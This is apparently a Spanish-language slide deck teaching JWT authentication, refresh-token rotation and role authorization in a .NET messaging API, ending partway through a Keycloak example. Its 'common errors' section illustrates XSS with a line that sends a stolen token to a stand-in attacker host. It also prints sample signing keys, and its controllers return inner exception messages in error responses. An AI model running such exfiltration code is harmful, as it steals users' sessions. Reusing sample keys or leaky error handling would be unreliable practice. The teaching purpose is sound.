<!-- _class: lead -->

# JWT + Autenticación en .NET

## Material Extra  -  Sistema de mensajería
### Rogelio Arriaga  -  Raptor Dev Services

---

<!-- _class: lead -->

# Parte 1
## Autenticación vs Autorización

---

## Autenticación vs Autorización

Son dos conceptos distintos que se confunden frecuentemente.

| Concepto | Pregunta que responde | Ejemplo en el sistema de mensajería |
|---|---|---|
| **Autenticación** | ¿Quién eres? | El agente ingresa email + password y recibe un JWT |
| **Autorización** | ¿Qué puedes hacer? | Solo un `Admin` puede eliminar agentes del workspace |

### Flujo básico en el sistema de mensajería

```
1. Agent  POST /api/auth/login  { email, password }
2. API verifica credenciales (BCrypt)
3. API emite Access Token (JWT) + Refresh Token
4. Agent incluye el token en cada request:
       Authorization: Bearer <access_token>
5. API valida el token -> extrae claims -> aplica autorización
```

> **Regla de oro:** la autenticación ocurre UNA VEZ; la autorización ocurre en CADA request.

---

<!-- _class: lead -->

# Parte 2
## JWT  -  Estructura y Claims

---

## JWT  -  Anatomía de un token

Un JWT es una cadena de tres partes separadas por puntos, cada una en Base64url.

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9        <- Header  (base64url)
.eyJzdWIiOiJ1c3ItMTIzIiwiZW1haWwiOiJhZ2VudGVAY3JtLmlvIn0
                                              <- Payload (base64url)
.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c <- Signature

Header:    { "alg": "HS256", "typ": "JWT" }
Payload:   { "sub": "550e8400-...", "email": "agente@example.com",
             "role": "Agent", "tenant_id": "42", "jti": "..." }
Signature: HMACSHA256(base64(header) + "." + base64(payload), Jwt:Key)
```

> El Payload es **solo Base64, no está cifrado**. No pongas passwords, datos de tarjeta ni información sensible en los claims.

---

## Claims estándar (RFC 7519)

| Claim | Nombre | Descripción |
|---|---|---|
| `sub` | Subject | Identificador único del usuario (GUID público) |
| `iss` | Issuer | Quién emitió el token |
| `aud` | Audience | Para quién es el token |
| `exp` | Expiration | Cuándo expira (Unix timestamp) |
| `iat` | Issued At | Cuándo se emitió |
| `jti` | JWT ID | ID único del token |

### Claims del sistema de mensajería

| Claim | Valor ejemplo | Uso en la API |
|---|---|---|
| `sub` | `"550e8400-e29b-41d4-a716-..."` | ID público del agente |
| `email` | `"agente@example.com"` | Auditoría, notificaciones |
| `http://schemas.microsoft.com/ws/2008/06/identity/claims/role` | `"Admin"` | Autorización por rol |
| `tenant_id` | `"42"` | Aislamiento multi-tenant |
| `jti` | `"8d4f1a..."` | Identificador único del token |

---

<!-- _class: lead -->

# Parte 3
## HS256 vs RS256

---

## HS256 vs RS256  -  ¿cuándo usar cada uno?

```csharp
// HS256  -  HMAC-SHA256 con secreto compartido
// Usa la misma clave para firmar Y verificar
// [OK] Simple, rápido, ideal para un solo servicio
// [Err] El secreto debe estar en todos los servicios que validen el token

var key   = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(secretKey));
var creds = new SigningCredentials(key, SecurityAlgorithms.HmacSha256);
```

```csharp
// RS256  -  RSA-SHA256 con par de claves pública/privada
// Firma con clave PRIVADA (solo el servidor de auth)
// Verifica con clave PÚBLICA (cualquier servicio, sin conocer la privada)
// [OK] Más seguro en microservicios
// [Err] Más lento que HS256

using var rsa  = RSA.Create(2048);
var privateKey = new RsaSecurityKey(rsa);
var rsaCreds   = new SigningCredentials(privateKey, SecurityAlgorithms.RsaSha256);
```

---

## HS256 vs RS256  -  decisión del proyecto

| Criterio | HS256 | RS256 |
|---|---|---|
| Sistema de mensajería (monolito modular, un servicio) | **[OK] Correcto** | Overhead innecesario |
| Microservicios con múltiples validadores | No recomendado | **[OK] Correcto** |
| Simplicidad operacional | **[OK]** | Requiere gestionar PKI |
| Velocidad de validación | **[OK] Más rápido** | Más lento (RSA) |

> **Decisión del proyecto:** usamos **HS256** con la clave `Jwt:Key` de ≥ 32 caracteres almacenada en **User Secrets** (desarrollo) y **AWS Secrets Manager** (producción). Nunca en `appsettings.json`.

---

<!-- _class: lead -->

# Parte 4
## Access Token + Refresh Token

---

## ¿Por qué necesitamos dos tokens?

El Access Token tiene vida corta para minimizar el daño si es interceptado. El Refresh Token permite renovar sin pedir credenciales al usuario.

```
+--------+  POST /api/auth/login   +-------------+
| Agent  | ---------------------- |     API     |
|  SPA   | <---------------------- |             |
`--------+  TokenDto { access_token, refresh_token, expires_at_utc }
            (access_token: 60 min  -  refresh_token: 30 días)

         … 59 minutos después …

+--------+  POST /api/auth/refresh  +-------------+
| Agent  | ----------------------- |     API     |
|  SPA   | <---------------------- |             |
`--------+  nuevo TokenDto (rotación del refresh token)
```

> El Access Token viaja en el header `Authorization: Bearer ...`. El Refresh Token se almacena en el cliente de forma segura (nunca en `localStorage`).

---

## TokenDto  -  el contrato de respuesta

```csharp
// Shared/Authentication/Authentication.Application/Dto/TokenDto.cs
namespace Authentication.Application.Dto;

public sealed record TokenDto(string AccessToken, string RefreshToken, DateTime ExpiresAtUtc);
```

Este record es el `Data` que retornan los tres casos de éxito:
- `LoginSuccess(TokenDto Data)`
- `RegisterSuccess(TokenDto Data)`
- `RefreshTokenSuccess(TokenDto Data)`

---

## Entidad RefreshToken en el dominio

```csharp
// Shared/Authentication/Authentication.Domain/Entities/RefreshToken.cs
namespace Authentication.Domain.Entities;

public sealed class RefreshToken
{
    public long     Id           { get; init; }
    public long     CredentialId { get; init; }
    public string   Token        { get; init; } = string.Empty;
    public DateTime ExpiresAtUtc { get; init; }
    public bool     IsRevoked    { get; init; }
    public DateTime CreatedAtUtc { get; init; }
}
```

> La entidad es un registro de persistencia puro  -  sin métodos de negocio. La lógica de rotación y revocación vive en el handler.

---

<!-- _class: lead -->

# Parte 5
## JWT en .NET 10  -  Configuración real

---

## JwtAuthExtensions  -  extensión del back-template

```csharp
// Host.Api/Extensions/JwtAuthExtensions.cs
using Microsoft.AspNetCore.Authentication.JwtBearer;
using Microsoft.IdentityModel.Tokens;
using System.Text;

namespace Host.Api.Extensions;

public static class JwtAuthExtensions
{
    public static IServiceCollection AddJwtAuthentication(
        this IServiceCollection services, IConfiguration configuration)
    {
        var key      = configuration["Jwt:Key"]
                       ?? throw new InvalidOperationException("Jwt:Key no está configurado.");
        var issuer   = configuration["Jwt:Issuer"]
                       ?? throw new InvalidOperationException("Jwt:Issuer no está configurado.");
        var audience = configuration["Jwt:Audience"]
                       ?? throw new InvalidOperationException("Jwt:Audience no está configurado.");

        services
            .AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
            .AddJwtBearer(options =>
            {
                options.TokenValidationParameters = new TokenValidationParameters
                {
                    ValidateIssuerSigningKey = true,
                    IssuerSigningKey         = new SymmetricSecurityKey(
                                                  Encoding.UTF8.GetBytes(key)),
                    ValidateIssuer           = true,
                    ValidIssuer              = issuer,
                    ValidateAudience         = true,
                    ValidAudience            = audience,
                    ValidateLifetime         = true,
                    ClockSkew                = TimeSpan.Zero
                };
            });

        return services;
    }
}
```

---

## Configuración en appsettings y User Secrets

```json
// appsettings.json  -  valores no sensibles
{
  "Jwt": {
    "Issuer":              "mensajeria-api",
    "Audience":            "mensajeria-client",
    "ExpirationMinutes":   60,
    "RefreshTokenExpiryDays": 30
  }
}
```

```
// User Secrets (desarrollo)  -  NUNCA en appsettings.json
dotnet user-secrets set "Jwt:Key" "X7k#mP9rQs2vLn4jDw8bEt6uAcYhFzK3GpN5sR1"

// Generar una clave segura con:
openssl rand -base64 32
```

> `ClockSkew = TimeSpan.Zero` en el back-template: sin tolerancia de reloj. Cualquier token expirado es rechazado inmediatamente.

---

## Program.cs  -  registro y pipeline real

```csharp
// Host.Api/Program.cs (fragmento relevante)

// Auth & API
builder.Services.AddJwtAuthentication(builder.Configuration);
// ...

var app = builder.Build();

app.UseCoreProblemDetails();
app.UseCorrelationId();
app.UseCors(CorsExtensions.PolicyName);

// Orden crítico: Authentication -> Authorization -> TenantClaims
app.UseAuthentication();
app.UseAuthorization();
app.UseMiddleware<TenantClaimsMiddleware>();

app.MapControllers();
```

> El orden de los middlewares importa. `UseAuthentication` debe ir antes de `UseAuthorization`. `TenantClaimsMiddleware` va después de ambos porque necesita que el usuario ya esté autenticado.

---

## TenantClaimsMiddleware  -  extraer tenant_id del JWT

```csharp
// Host.Api/Middleware/TenantClaimsMiddleware.cs
using Common.MultiTenancy;

namespace Host.Api.Middleware;

public sealed class TenantClaimsMiddleware
{
    private readonly RequestDelegate _next;

    public TenantClaimsMiddleware(RequestDelegate next) => _next = next;

    public async Task InvokeAsync(HttpContext context, ITenantContextAccessor tenantCtx)
    {
        if (context.User.Identity?.IsAuthenticated == true)
        {
            var tenantId = context.User.FindFirst("tenant_id")?.Value;
            if (!string.IsNullOrEmpty(tenantId))
                tenantCtx.Current = new TenantContext(tenantId);
        }

        await _next(context);
    }
}
```

> Gracias a este middleware, cada handler puede acceder al tenant del agente sin leer el JWT directamente. EF Core usa `ITenantContextAccessor` en el global query filter para aislar los datos.

---

## IJwtTokenService  -  interfaz del servicio de tokens

```csharp
// Shared/Authentication/Authentication.Application/Services/IJwtTokenService.cs
namespace Authentication.Application.Services;

public interface IJwtTokenService
{
    string   GenerateAccessToken(Guid userPublicId, string email, string role, long tenantId);
    string   GenerateRefreshToken();
    DateTime GetRefreshTokenExpiry();
}
```

---

## JwtTokenService  -  implementación en Infrastructure

```csharp
// Shared/Authentication/Authentication.Infrastructure/Services/JwtTokenService.cs
public sealed class JwtTokenService : IJwtTokenService
{
    private readonly IConfiguration _config;

    public JwtTokenService(IConfiguration config) => _config = config;

    public string GenerateAccessToken(Guid userPublicId, string email, string role, long tenantId)
    {
        var key    = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(_config["Jwt:Key"]!));
        var creds  = new SigningCredentials(key, SecurityAlgorithms.HmacSha256);
        var expiry = DateTime.UtcNow.AddMinutes(_config.GetValue<int>("Jwt:ExpirationMinutes", 60));

        var claims = new[]
        {
            new Claim(JwtRegisteredClaimNames.Sub,   userPublicId.ToString()),
            new Claim(JwtRegisteredClaimNames.Email, email),
            new Claim(JwtRegisteredClaimNames.Jti,   Guid.NewGuid().ToString()),
            new Claim(ClaimTypes.Role,               role),
            new Claim("tenant_id",                   tenantId.ToString()),
        };

        var token = new JwtSecurityToken(
            issuer:             _config["Jwt:Issuer"],
            audience:           _config["Jwt:Audience"],
            claims:             claims,
            expires:            expiry,
            signingCredentials: creds);

        return new JwtSecurityTokenHandler().WriteToken(token);
    }
}
```

---

## JwtTokenService  -  refresh y expiry

```csharp
    public string GenerateRefreshToken()
    {
        var bytes = RandomNumberGenerator.GetBytes(64);
        return Convert.ToBase64String(bytes);
    }

    public DateTime GetRefreshTokenExpiry() =>
        DateTime.UtcNow.AddDays(_config.GetValue<int>("Jwt:RefreshTokenExpiryDays", 30));
```

> `GenerateRefreshToken()` produce 64 bytes aleatorios codificados en Base64 (86 caracteres). No es un JWT  -  es un token opaco que solo tiene significado al buscarlo en la base de datos.

---

<!-- _class: lead -->

# Parte 6
## Flujo Login  -  Request  -  Handler  -  Responses

---

## Responses del caso Login  -  jerarquía real

```csharp
// Shared/Authentication/Authentication.Application/UseCases/Login/Responses/

// Base abstract  -  el mediador publica LoginResponse como INotification
public abstract record LoginResponse : IResponse;

// Caso éxito  -  implementa ISuccess<TokenDto>
public sealed record LoginSuccess(TokenDto Data)
    : LoginResponse, ISuccess<TokenDto>;

// Caso fallo  -  implementa IFailure
public sealed record LoginInvalidCredentialsFailure(string Message)
    : LoginResponse, IFailure;
```

> El Presenter hace pattern matching sobre `IFailure` / `ISuccess<TokenDto>`  -  no sobre los tipos concretos. El Controller hace pattern matching sobre el tipo concreto para mapear el HTTP status code correcto.

---

## LoginRequest  -  el comando

```csharp
// Shared/Authentication/Authentication.Application/UseCases/Login/LoginRequest.cs
using Authentication.Application.UseCases.Login.Responses;
using Common.Messaging;

namespace Authentication.Application.UseCases.Login;

public sealed record LoginRequest(string Email, string Password)
    : IRequest<LoginResponse>;
```

---

## LoginHandler  -  el flujo completo

```csharp
// Shared/Authentication/Authentication.Application/UseCases/Login/LoginHandler.cs
using Authentication.Application.Dto;
using Authentication.Application.Services;
using Authentication.Application.UseCases.Login.Responses;
using Authentication.Domain.Repositories;
using Common.Messaging;

namespace Authentication.Application.UseCases.Login;

public sealed class LoginHandler : IRequestHandler<LoginRequest, LoginResponse>
{
    private readonly IUserCredentialRepository _credentials;
    private readonly IRefreshTokenRepository   _refreshTokens;
    private readonly IPasswordHasher           _hasher;
    private readonly IJwtTokenService          _jwt;
    // ... constructor
    public async Task<LoginResponse> Handle(
        LoginRequest request, CancellationToken cancellationToken)
    {
        var credential = await _credentials.GetForLoginAsync(request.Email, cancellationToken);

        if (credential is null || !_hasher.Verify(request.Password, credential.PasswordHash)
                                || !credential.IsActive)
            return new LoginInvalidCredentialsFailure("Credenciales inválidas.");

        var accessToken  = _jwt.GenerateAccessToken(
            credential.PublicId, credential.Email, credential.Role, credential.TenantId);
        var refreshToken = _jwt.GenerateRefreshToken();
        var expiry       = _jwt.GetRefreshTokenExpiry();

        await _refreshTokens.InsertAsync(credential.Id, refreshToken, expiry, cancellationToken);

        return new LoginSuccess(new TokenDto(accessToken, refreshToken, expiry));
    }
}
```

---

## LoginPresenter  -  pattern matching real

```csharp
// Shared/Authentication/Authentication.Presentation/Presenters/LoginPresenter.cs
using Authentication.Application.Dto;
using Authentication.Application.UseCases.Login.Responses;
using Common.Messaging;
using Common.Results;
using Common.ViewModels;

namespace Authentication.Presentation.Presenters;

public sealed class LoginPresenter : INotificationHandler<LoginResponse>
{
    private readonly ResultViewModel<AuthController> _viewModel;

    public LoginPresenter(ResultViewModel<AuthController> viewModel)
        => _viewModel = viewModel;

    public Task Handle(LoginResponse notification, CancellationToken cancellationToken)
    {
        if (notification is IFailure failure)
            _viewModel.Fail(failure.Message);
        else if (notification is ISuccess<TokenDto> success)
            _viewModel.Set(success);

        return Task.CompletedTask;
    }
}
```

---

## AuthController  -  Login y status codes HTTP

```csharp
// Shared/Authentication/Authentication.Presentation/Controllers/AuthController.cs
[Route("api/auth")]
[AllowAnonymous]
public sealed class AuthController : BaseApiController
{
    [HttpPost("login")]
    public async Task<IActionResult> Login([FromBody] LoginBody body, CancellationToken ct = default)
    {
        try
        {
            var result = await Mediator.Send(new LoginRequest(body.Email, body.Password), ct);
            if (_viewModel.IsSuccess) return Ok(_viewModel);
            return result is LoginInvalidCredentialsFailure
                ? Unauthorized(_viewModel)
                : StatusCode(500, _viewModel);
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Error en Login");
            var inner = ex;
            while (inner.InnerException != null) inner = inner.InnerException!;
            return StatusCode(500, _viewModel.Fail(inner.Message));
        }
    }
}
```

> `200 OK` si `IsSuccess`, `401 Unauthorized` si credenciales inválidas, `500` para cualquier otra falla.

---

<!-- _class: lead -->

# Parte 7
## Flujo Register  -  Request  -  Handler  -  Responses

---

## Responses del caso Register  -  jerarquía real

```csharp
// Shared/Authentication/Authentication.Application/UseCases/Register/Responses/

public abstract record RegisterResponse : IResponse;

// Registro exitoso  -  emite tokens igual que Login
public sealed record RegisterSuccess(TokenDto Data)
    : RegisterResponse, ISuccess<TokenDto>;

// Email ya registrado en el workspace
public sealed record RegisterEmailConflictFailure(string Message)
    : RegisterResponse, IConflictFailure;

// TenantId no existe o está inactivo
public sealed record RegisterTenantNotFoundFailure(string Message)
    : RegisterResponse, INotFoundFailure;
```

---

## RegisterRequest  -  el comando

```csharp
// Shared/Authentication/Authentication.Application/UseCases/Register/RegisterRequest.cs
using Authentication.Application.UseCases.Register.Responses;
using Common.Messaging;

namespace Authentication.Application.UseCases.Register;

public sealed record RegisterRequest(
    string Email,
    string Password,
    long   TenantId,
    string FullName,
    string Role) : IRequest<RegisterResponse>;
```

> `TenantId` es `long`  -  el ID interno del workspace en la base de datos. `Role` llega como string: `"Admin"`, `"Agent"`, o `"Viewer"`.

---

## RegisterHandler  -  flujo con validaciones

```csharp
// Shared/Authentication/Authentication.Application/UseCases/Register/RegisterHandler.cs
public async Task<RegisterResponse> Handle(
    RegisterRequest request, CancellationToken cancellationToken)
{
    // 1. Verificar que el tenant existe y está activo
    var tenant = await _tenancy.GetTenantByIdAsync(request.TenantId, cancellationToken);
    if (tenant is null || !tenant.IsActive)
        return new RegisterTenantNotFoundFailure("Empresa no encontrada o inactiva.");

    // 2. Verificar que el email no está registrado
    var exists = await _credentials.ExistsByEmailAsync(request.Email, cancellationToken);
    if (exists)
        return new RegisterEmailConflictFailure("El correo ya está registrado.");

    // 3. Crear credencial con password hasheado
    var hash       = _hasher.Hash(request.Password);
    var credential = await _credentials.InsertAsync(
        request.TenantId, request.Email, hash, request.Role, cancellationToken);

    // 4. Publicar evento de integración (crea el User en el módulo Users)
    await _mediator.Publish(new UserShouldBeCreatedIntegrationEvent(
        credential.PublicId, credential.TenantId,
        request.FullName, credential.Email, credential.Role), cancellationToken);

    // 5. Emitir tokens igual que Login
    var accessToken  = _jwt.GenerateAccessToken(
        credential.PublicId, credential.Email, credential.Role, credential.TenantId);
    var refreshToken = _jwt.GenerateRefreshToken();
    var expiry       = _jwt.GetRefreshTokenExpiry();
    await _refreshTokens.InsertAsync(credential.Id, refreshToken, expiry, cancellationToken);

    return new RegisterSuccess(new TokenDto(accessToken, refreshToken, expiry));
}
```

---

## AuthController  -  Register y status codes HTTP

```csharp
[HttpPost("register")]
public async Task<IActionResult> Register(
    [FromBody] RegisterBody body, CancellationToken ct = default)
{
    try
    {
        var result = await Mediator.Send(
            new RegisterRequest(body.Email, body.Password,
                                body.TenantId, body.FullName, body.Role), ct);
        if (_viewModel.IsSuccess) return Ok(_viewModel);
        if (result is RegisterEmailConflictFailure)  return Conflict(_viewModel);
        if (result is RegisterTenantNotFoundFailure) return NotFound(_viewModel);
        return StatusCode(500, _viewModel);
    }
    catch (Exception ex)
    {
        _logger.LogError(ex, "Error en Register");
        var inner = ex;
        while (inner.InnerException != null) inner = inner.InnerException!;
        return StatusCode(500, _viewModel.Fail(inner.Message));
    }
}
```

> `200 OK`  -  `409 Conflict` (email duplicado)  -  `404 Not Found` (tenant inválido)  -  `500` para otras fallas.

---

<!-- _class: lead -->

# Parte 8
## Flujo Refresh Token  -  Request  -  Handler  -  Responses

---

## Responses del caso RefreshToken  -  jerarquía real

```csharp
// Shared/Authentication/Authentication.Application/UseCases/RefreshToken/Responses/

public abstract record RefreshTokenResponse : IResponse;

// Rotación exitosa  -  nuevos tokens
public sealed record RefreshTokenSuccess(TokenDto Data)
    : RefreshTokenResponse, ISuccess<TokenDto>;

// Token inválido, revocado o expirado
public sealed record RefreshTokenInvalidFailure(string Message)
    : RefreshTokenResponse, IFailure;
```

---

## RefreshTokenHandler  -  rotación segura real

```csharp
// Shared/Authentication/Authentication.Application/UseCases/RefreshToken/RefreshTokenHandler.cs
public async Task<RefreshTokenResponse> Handle(
    RefreshTokenRequest request, CancellationToken cancellationToken)
{
    // 1. Buscar token en la DB
    var existing = await _refreshTokens.GetByTokenAsync(request.Token, cancellationToken);

    // 2. Validar: debe existir, no estar revocado y no haber expirado
    if (existing is null || existing.IsRevoked || existing.ExpiresAtUtc <= DateTime.UtcNow)
        return new RefreshTokenInvalidFailure("Token de actualización inválido o expirado.");

    // 3. Verificar que el agente sigue activo
    var credential = await _credentials.GetByIdAsync(existing.CredentialId, cancellationToken);
    if (credential is null || !credential.IsActive)
        return new RefreshTokenInvalidFailure("Usuario no encontrado o inactivo.");

    // 4. Revocar el token anterior
    await _refreshTokens.RevokeAsync(request.Token, cancellationToken);

    // 5. Emitir nuevos tokens
    var newAccessToken  = _jwt.GenerateAccessToken(
        credential.PublicId, credential.Email, credential.Role, credential.TenantId);
    var newRefreshToken = _jwt.GenerateRefreshToken();
    var expiry          = _jwt.GetRefreshTokenExpiry();
    await _refreshTokens.InsertAsync(credential.Id, newRefreshToken, expiry, cancellationToken);

    return new RefreshTokenSuccess(new TokenDto(newAccessToken, newRefreshToken, expiry));
}
```

---

## RefreshTokenPresenter  -  mismo patrón que Login

```csharp
// Shared/Authentication/Authentication.Presentation/Presenters/RefreshTokenPresenter.cs
public sealed class RefreshTokenPresenter : INotificationHandler<RefreshTokenResponse>
{
    private readonly ResultViewModel<AuthController> _viewModel;

    public RefreshTokenPresenter(ResultViewModel<AuthController> viewModel)
        => _viewModel = viewModel;

    public Task Handle(RefreshTokenResponse notification, CancellationToken cancellationToken)
    {
        if (notification is IFailure failure)
            _viewModel.Fail(failure.Message);
        else if (notification is ISuccess<TokenDto> success)
            _viewModel.Set(success);

        return Task.CompletedTask;
    }
}
```

---

## Almacenamiento seguro del Refresh Token

| Aspecto | Decisión del proyecto | Razón |
|---|---|---|
| Dónde guardar en el cliente | Fuera de `localStorage` | JavaScript no debe acceder al refresh token |
| Dónde guardar en el servidor | Tabla `RefreshTokens` en PostgreSQL | Permite invalidar por usuario o dispositivo |
| Qué hacer al hacer logout | `RevokeAsync(token)`  -  `IsRevoked = true` | Impide reutilización |
| Qué hacer al rotar | Revocar el anterior + insertar el nuevo | Detecta reuse attacks |
| TTL del refresh token | 30 días (configurable en `Jwt:RefreshTokenExpiryDays`) | Balance entre UX y seguridad |

> Si un token ya revocado es utilizado de nuevo, se debe invalidar **todos** los tokens del agente  -  señal de posible robo de sesión.

---

<!-- _class: lead -->

# Parte 9
## Claims en los Endpoints

---

## [Authorize] y roles en los endpoints

```csharp
// Presentation/Controllers/ConversationsController.cs

// Requiere cualquier agente autenticado
[Authorize]
[HttpGet("conversations")]
public async Task<IActionResult> GetAll(CancellationToken ct) { ... }

// Solo Admin puede eliminar agentes
[Authorize(Roles = "Admin")]
[HttpDelete("agents/{id:long}")]
public async Task<IActionResult> DeleteAgent(long id, CancellationToken ct) { ... }

// Admin o Agent pueden asignar conversaciones
[Authorize(Roles = "Admin,Agent")]
[HttpPost("conversations/{id:long}/assign")]
public async Task<IActionResult> Assign(long id, CancellationToken ct) { ... }
```

> Los roles exactos en el sistema de mensajería son: `Admin`, `Agent`, `Viewer`. Deben coincidir con el string almacenado en `credential.Role` y el claim `ClaimTypes.Role` del JWT.

---

## Leer claims en un Controller  -  CurrentTenantId

```csharp
// Presentation/Controllers/BaseAuthController.cs (patrón del back-template)
using System.Security.Claims;
using Microsoft.AspNetCore.Mvc;

public abstract class BaseAuthController : BaseApiController
{
    // Lee el claim "tenant_id" del JWT  -  disponible gracias a TenantClaimsMiddleware
    protected long CurrentTenantId =>
        long.TryParse(User.FindFirstValue("tenant_id"), out var id) ? id : 0;

    // Lee el claim "sub" del JWT  -  GUID público del agente
    protected Guid CurrentAgentPublicId =>
        Guid.TryParse(User.FindFirstValue(JwtRegisteredClaimNames.Sub), out var g)
            ? g : Guid.Empty;

    // Lee el claim de rol
    protected string CurrentRole =>
        User.FindFirstValue(ClaimTypes.Role) ?? string.Empty;
}
```

---

## Políticas de autorización en Program.cs

```csharp
// Host.Api/Program.cs  -  si necesitas políticas compuestas
builder.Services.AddAuthorization(options =>
{
    options.AddPolicy("RequireAdmin", policy =>
        policy.RequireRole("Admin"));

    options.AddPolicy("RequireAgentOrAdmin", policy =>
        policy.RequireRole("Admin", "Agent"));

    // Política para endpoints internos (e.g. webhook receivers)
    options.AddPolicy("RequireAnyRole", policy =>
        policy.RequireRole("Admin", "Agent", "Viewer"));
});
```

```csharp
// Uso en controller
[Authorize(Policy = "RequireAdmin")]
[HttpDelete("workspace")]
public async Task<IActionResult> DeleteWorkspace(CancellationToken ct) { ... }
```

---

<!-- _class: lead -->

# Parte 10
## Common.Results  -  Interfaces del patrón

---

## IFailure, ISuccess, IConflictFailure, INotFoundFailure

```csharp
// Common/Common/Results/IFailure.cs
namespace Common.Results
{
    public interface IFailure
    {
        string Message { get; }
    }

    public interface IValidationFailure : IFailure { }

    public interface INotFoundFailure : IFailure { }

    public interface IConflictFailure : IFailure { }
}
```

```csharp
// Common/Common/Results/ISuccess.cs
namespace Common.Results
{
    public interface ISuccess { }

    public interface ISuccess<T> : ISuccess
    {
        T Data { get; }
    }
}
```

> Los Presenters hacen pattern matching sobre estas interfaces  -  nunca sobre los tipos concretos de los Response. El Controller sí pattern-matchea sobre el tipo concreto para elegir el HTTP status code.

---

## Tabla maestra de HTTP status codes

| Response concreto | Interface | HTTP status en el Controller |
|---|---|---|
| `LoginSuccess` | `ISuccess<TokenDto>` | `200 OK` |
| `LoginInvalidCredentialsFailure` | `IFailure` | `401 Unauthorized` |
| `RegisterSuccess` | `ISuccess<TokenDto>` | `200 OK` |
| `RegisterEmailConflictFailure` | `IConflictFailure` | `409 Conflict` |
| `RegisterTenantNotFoundFailure` | `INotFoundFailure` | `404 Not Found` |
| `RefreshTokenSuccess` | `ISuccess<TokenDto>` | `200 OK` |
| `RefreshTokenInvalidFailure` | `IFailure` | `401 Unauthorized` |

---

<!-- _class: lead -->

# Parte 11
## Errores Comunes

---

## Error 1: JWT en localStorage

```javascript
//  MAL  -  localStorage es accesible desde cualquier script JavaScript
localStorage.setItem('access_token', jwt);

// Si hay un XSS en la app, el atacante roba el token:
fetch('https://attacker.com/steal?t=' + localStorage.getItem('access_token'));
```

```javascript
//  BIEN  -  Access Token solo en memoria (variable de módulo en React)
let accessToken = null;  // en memoria  -  no persiste al recargar la página

// Al iniciar la app: llamar POST /api/auth/refresh
// Si el refresh token también expiró -> redirigir al login
// El Refresh Token se guarda según la decisión de arquitectura del equipo
// (httpOnly cookie server-side, o almacenamiento seguro en el cliente)
```

> **Regla del proyecto:** el Access Token vive en memoria (variable JS). Nunca en `localStorage`, nunca en `sessionStorage`.

---

## Error 2: No validar `exp` ni la firma

```csharp
//  MAL  -  decodificar sin validar (nunca hacer esto en producción)
var handler = new JwtSecurityTokenHandler();
var token   = handler.ReadJwtToken(rawToken); // NO valida firma ni expiración
var userId  = token.Claims.First(c => c.Type == "sub").Value;
```

```csharp
//  BIEN  -  el middleware AddJwtAuthentication ya valida automáticamente:
// ValidateIssuerSigningKey = true  -> verifica la firma con Jwt:Key
// ValidateLifetime         = true  -> rechaza tokens expirados
// ValidateIssuer           = true  -> verifica Jwt:Issuer
// ValidateAudience         = true  -> verifica Jwt:Audience
// ClockSkew                = TimeSpan.Zero -> sin tolerancia de reloj

// En los Controllers, solo necesitas [Authorize]  -
// el framework ya rechazó el request si el token era inválido.
```

---

## Error 3: Secreto débil o expuesto

```
//  MAL  -  secreto corto y en appsettings.json
"Jwt": { "Key": "secret" }  // 6 chars  -  vulnerable a brute force

//  MAL  -  secreto en appsettings.json commiteado al repo
"Jwt": { "Key": "mi-clave-en-git-publica" }

//  BIEN  -  User Secrets en desarrollo
dotnet user-secrets set "Jwt:Key" "X7k#mP9rQs2vLn4jDw8bEt6uAcYhFzK3GpN5sR1"

//  BIEN  -  AWS Secrets Manager en producción
// La clave se inyecta como variable de entorno al contenedor:
//   JWT__KEY=X7k#mP9rQs2vLn4jDw8bEt6uAcYhFzK3GpN5sR1
// .NET lee automáticamente las doble-underscore como separador de sección

// Mínimo recomendado: 32 caracteres aleatorios (256 bits)
openssl rand -base64 32
```

> La clave de configuración es `Jwt:Key` (no `Jwt:SecretKey`). Verificar que coincida en `JwtAuthExtensions.cs` y `JwtTokenService.cs`.

---

## Error 4: ClockSkew demasiado permisivo

```csharp
//  MAL  -  tolerancia de 5 minutos por defecto de .NET
// TokenValidationParameters sin ClockSkew explícito ->
// un token "expirado" sigue siendo válido 5 minutos más

//  BIEN  -  el back-template usa ClockSkew = TimeSpan.Zero
options.TokenValidationParameters = new TokenValidationParameters
{
    // ...
    ValidateLifetime = true,
    ClockSkew        = TimeSpan.Zero   // <- sin tolerancia
};
```

> Con `ClockSkew = TimeSpan.Zero` los servidores deben tener sus relojes sincronizados (NTP). En AWS los EC2 y contenedores ECS tienen NTP configurado por defecto.

---

## Error 5: Singleton con dependencias Scoped

```csharp
//  MAL  -  registrar JwtTokenService como Singleton cuando usa DbContext (Scoped)
// Si el servicio accede a la DB, no puede ser Singleton
services.AddSingleton<IJwtTokenService, JwtTokenService>(); //

//  BIEN  -  JwtTokenService solo usa IConfiguration (Singleton)
// IConfiguration es Singleton -> JwtTokenService puede ser Singleton
services.AddSingleton<IJwtTokenService, JwtTokenService>(); // [OK] en este caso

// La regla: un Singleton NO puede depender de un Scoped
// Singleton -> Singleton [OK]
// Singleton -> Transient [OK]
// Singleton -> Scoped     (Captive Dependency)
// Scoped    -> Scoped    [OK]
// Scoped    -> Transient [OK]
```

---

<!-- _class: lead -->

# Parte 12
## Keycloak como Proveedor Externo

---

## ¿Qué es Keycloak?

Keycloak es un **Identity Provider (IdP)** open-source que centraliza la autenticación.

```
OAuth2:         protocolo de autorización  -  "¿qué puede hacer este token?"
OpenID Connect: extensión de OAuth2 para autenticación  -  "¿quién eres?"

Roles en OAuth2:
  Resource Owner       = el agente (usuario final)
  Client               = la SPA del CRM
  Authorization Server = Keycloak
  Resource Server      = la API .NET
```

### Diferencia clave con JWT propio

| Aspecto | JWT propio (Sistema de mensajería) | Keycloak |
|---|---|---|
| Quién emite el token | Nuestra API | Servidor Keycloak separado |
| SSO entre apps | No incluido | Incluido |
| Proveedores externos (Google) | Implementar manualmente | Identity Brokering integrado |
| MFA | Implementar manualmente | Configuración en la UI |

---

## Configurar .NET para validar tokens de Keycloak

```csharp
// appsettings.json
// {
//   "Keycloak": {
//     "Authority": "https://auth.ejemplo.io/realms/crm",
//     "Audience":  "crm-api",
//     "RequireHttps": true
//   }
// }

// Host.Api/Extensions/JwtAuthExtensions.cs  -  variante Keycloak
builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(options =>
    {
        // Keycloak publica las claves públicas automáticamente en
        // /.well-known/openid-configuration  -  no necesitamos configurar la clave
        options.Authority = builder.Configuration["Keycloak:Authority"];
